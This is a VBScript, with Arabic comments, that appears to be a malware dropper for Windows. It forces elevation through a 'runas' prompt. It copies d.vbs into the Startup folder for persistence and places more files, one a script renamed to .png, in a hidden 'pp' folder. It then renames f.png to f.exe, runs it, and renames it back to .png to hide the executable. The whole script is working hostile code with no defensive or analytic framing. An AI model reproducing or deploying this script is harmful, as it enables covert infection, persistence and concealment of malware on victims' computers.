If Not WScript.Arguments.Named.Exists("elevated") Then
    CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 1
    WScript.Quit
End If

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' تحديد مسار السكربت الحالي
Dim scriptPath
scriptPath = objFSO.GetParentFolderName(WScript.ScriptFullName)

' مسار ملف d.vbs
Dim cVbsFilePath
cVbsFilePath = scriptPath & "\d.vbs"

' مسار ملف p.png
Dim pPngFilePath
pPngFilePath = scriptPath & "\p.png"

' مسار مجلد التشغيل التلقائي
Dim startupFolderPath
startupFolderPath = objShell.SpecialFolders("Startup")

' مسار مجلد pp داخل مجلد التشغيل التلقائي
Dim ppFolderPath
ppFolderPath = startupFolderPath & "\pp"

' إنشاء مجلد pp إذا لم يكن موجودًا
If Not objFSO.FolderExists(ppFolderPath) Then
    objFSO.CreateFolder(ppFolderPath)
End If

' نسخ d.vbs إلى مجلد التشغيل التلقائي
If objFSO.FileExists(cVbsFilePath) Then
    objFSO.CopyFile cVbsFilePath, startupFolderPath & "\d.vbs"
End If

' نسخ p.png إلى مجلد pp
If objFSO.FileExists(pPngFilePath) Then
    objFSO.CopyFile pPngFilePath, ppFolderPath & "\p.png"
End If

' مسار ملف e.vbs
Dim eVbsFilePath
eVbsFilePath = scriptPath & "\e.vbs"

' نسخ e.vbs إلى مجلد pp
If objFSO.FileExists(eVbsFilePath) Then
    objFSO.CopyFile eVbsFilePath, ppFolderPath & "\e.png"
End If

' مسار ملف f.png و f.exe
Dim fPngFilePath, fExeFilePath
fPngFilePath = scriptPath & "\f.png"
fExeFilePath = scriptPath & "\f.exe"

' إعادة تسمية f.png إلى f.exe
If objFSO.FileExists(fPngFilePath) Then
    objFSO.MoveFile fPngFilePath, fExeFilePath
End If

' تشغيل f.exe
If objFSO.FileExists(fExeFilePath) Then
    objShell.Run """" & fExeFilePath & """", 1, False
    WScript.Sleep 10000 ' الانتظار لمدة 10 ثوانٍ
    ' إعادة تسمية f.exe إلى f.png
    If objFSO.FileExists(fExeFilePath) Then
        objFSO.MoveFile fExeFilePath, fPngFilePath
    End If
End If
